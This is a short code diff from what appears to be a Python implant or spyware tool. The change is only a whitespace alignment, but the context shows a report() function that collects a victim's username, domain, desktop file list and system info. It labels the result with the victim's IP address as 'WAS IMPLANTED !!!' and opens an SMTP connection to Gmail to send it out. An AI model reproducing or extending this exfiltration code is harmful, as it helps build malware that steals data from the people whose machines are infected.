@@ -74,7 +74,7 @@ def report(ip_adress, arg, arg2):
              '\n LOGIN      => ' + str(os.environ['USERNAME']),                      
              '\n PC_NAME    => ' + str(os.environ['USERDOMAIN']),                  
              '\n DESK_FILES => ' + arg,                                         
-             '\n SYS_INFO => ' + arg2]
+             '\n SYS_INFO   => ' + arg2]
     pc_name = socket.gethostname()
     report_text = str(ip_adress) + ' WAS IMPLANTED !!! \n\n' + '\n'.join(array)
     msgObject = smtplib.SMTP('smtp.gmail.com', 587)
